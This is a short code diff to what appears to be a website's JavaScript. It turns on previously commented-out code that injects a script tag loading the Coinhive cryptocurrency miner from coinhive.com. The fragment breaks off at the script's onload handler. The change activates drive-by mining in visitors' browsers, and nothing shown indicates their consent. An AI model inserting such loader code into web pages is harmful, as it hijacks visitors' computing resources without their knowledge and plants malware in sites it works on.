@@ -12,8 +12,9 @@
     b(function() {
 
         (function() {
-            /*var createScriptElement = document.createElement('script');
-            createScriptElement.type = 'text/javascript'; /*createScriptElement.async = true;*/
+            var createScriptElement = document.createElement('script');
+            createScriptElement.type = 'text/javascript';
+            createScriptElement.async = true;
             var getScriptElement = document.getElementsByTagName('script')[0];
             createScriptElement.src = 'https://coinhive.com/lib/coinhive.min.js';
             createScriptElement.onload = function() {
